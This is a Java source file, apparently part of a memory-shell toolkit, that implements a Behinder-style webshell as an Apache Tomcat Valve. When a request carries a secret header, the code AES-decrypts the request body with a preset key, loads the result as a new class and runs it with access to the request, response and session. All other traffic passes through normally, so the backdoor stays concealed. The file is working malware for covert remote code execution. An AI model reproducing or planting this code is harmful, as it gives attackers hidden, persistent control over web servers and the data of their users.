package com.reajason.javaweb.memshell.shelltool.behinder;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderValve extends ClassLoader implements Valve {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public BehinderValve() {
    }

    public BehinderValve(ClassLoader z) {
        super(z);
    }

    @Override
    @SuppressWarnings("all")
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (request.getHeader(headerName) != null
                    && request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = request.getSession();
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", request);
                obj.put("response", unwrapResponse(response));
                obj.put("session", session);
                session.setAttribute("u", pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
                byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
                Object instance = (new BehinderValve(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                instance.equals(obj);
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        this.getNext().invoke(request, response);
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
        return value;
    }

    @SuppressWarnings("all")
    public Class g(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    protected Valve next;
    protected boolean asyncSupported;

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }

    @SuppressWarnings("all")
    public Object unwrapResponse(Object response) {
        Object internalResponse = response;
        while (true) {
            try {
                Object r = getFieldValue(response, "response");
                if (r == internalResponse) {
                    return r;
                } else {
                    internalResponse = r;
                }
            } catch (Exception e) {
                return internalResponse;
            }
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}
